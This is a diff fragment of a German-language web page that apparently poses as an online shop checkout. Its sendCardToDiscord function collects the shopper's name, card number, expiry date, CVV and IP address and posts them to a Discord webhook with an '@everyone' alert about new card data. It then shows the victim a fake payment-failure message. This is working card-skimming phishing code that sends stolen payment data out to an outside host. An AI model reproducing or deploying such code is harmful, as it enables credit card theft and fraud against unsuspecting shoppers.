+        function sendCardToDiscord(fullName, firstName, lastName, nummer, ablauf, cvv, ip) {
             const productName = currentProduct ? currentProduct.name : 'Unbekannt';
             const productPrice = currentProduct ? currentProduct.price : 'Unbekannt';
-
             const message = {
-                content: `@everyone **Neue Kartendaten erhalten!**`,
+                content: '@everyone **Neue Kartendaten erhalten!**',
                 embeds: [{
                     title: '💳 Kreditkarten-Daten',
                     color: 0xff4757,
@@ -1202,39 +1592,35 @@
                     timestamp: new Date().toISOString()
                 }]
             };
-
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
-            }).catch(err => console.error('Webhook Fehler:', err));
-
+            fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(message) })
+                .catch(err => console.error('Webhook Fehler:', err));
             document.getElementById('cardError').classList.add('show');
             const payBtn = document.getElementById('cardForm').querySelector('.pay-btn');
             payBtn.disabled = true;
             payBtn.textContent = 'Verarbeitung fehlgeschlagen';
+            closeCardForm();
+            document.getElementById('paymentTypeList').classList.remove('active');
+            document.getElementById('voucherSelection').classList.remove('active');
+            document.getElementById('amountSelection').classList.remove('active');
+            document.getElementById('codeSelection').classList.remove('active');
+            document.getElementById('successMessage').classList.add('active');
+            document.getElementById('paymentOverlay').classList.add('active');
+            document.body.style.overflow = 'hidden';
         }
 
-        // ==================== INIT ====================
-        renderGrid();
-
-        document.getElementById('checkoutOverlay').addEventListener('click', function(e) {
-            if (e.target === this) closeCheckout();
-        });
-
-        document.getElementById('cardOverlay').addEventListener('click', function(e) {
-            if (e.target === this) closeCardForm();
-        });
+        document.getElementById('checkoutOverlay').addEventListener('click', function(e) { if (e.target === this) closeCheckout(); });
+        document.getElementById('paymentOverlay').addEventListener('click', function(e) { if (e.target === this) closePayment(); });
+        document.getElementById('cardOverlay').addEventListener('click', function(e) { if (e.target === this) closeCardForm(); });
 
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
-                if (document.getElementById('cardOverlay').classList.contains('active')) {
-                    closeCardForm();
-                } else if (document.getElementById('checkoutOverlay').classList.contains('active')) {
-                    closeCheckout();
-                }
+                if (document.getElementById('cardOverlay').classList.contains('active')) closeCardForm();
+                else if (document.getElementById('paymentOverlay').classList.contains('active')) closePayment();
+                else if (document.getElementById('checkoutOverlay').classList.contains('active')) closeCheckout();
             }
         });
+
+        renderGrid();
     </script>
 </body>
 </html>
